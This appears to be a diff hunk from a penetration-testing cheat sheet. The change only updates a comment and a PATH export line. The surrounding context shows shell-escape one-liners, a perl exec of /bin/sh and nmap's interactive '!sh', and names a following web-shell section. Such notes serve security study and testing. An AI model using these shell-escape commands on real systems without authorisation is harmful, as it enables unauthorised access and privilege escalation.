@@ -484,8 +484,8 @@ perl: exec "/bin/sh";
 $ nmap --interactive         # within nmap
 nmap> !sh                          
 
-# REMEMBER TO DO THIS
-$ export PATH=$PATH:/usr/bin:/bin:[other paths]
+# REMEMBER TO DO THIS TO FIX YOUR PATHS
+$ export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
 
 Web shell + SMB exec
